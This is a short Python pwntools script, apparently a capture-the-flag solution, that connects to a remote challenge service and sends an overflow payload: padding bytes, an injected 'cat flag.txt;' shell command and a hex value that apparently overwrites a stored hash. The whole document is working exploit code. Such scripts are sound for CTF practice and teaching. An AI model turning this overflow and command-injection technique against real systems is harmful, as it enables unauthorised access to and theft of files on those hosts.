from pwn import *
p=process("./secret_file")
p=remote("111.198.29.45","50837")
context.log_level='debug'
payload='a'*0x100
payload+='cat flag.txt;'
payload=payload.ljust(0x2f8-0x1dd,'c')
payload+="02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe"
#p.interactive()
# gdb.attach(p,"breakrva 0xbd5")
p.sendline(payload)
p.recv()
context.log_level='info'
p.interactive()
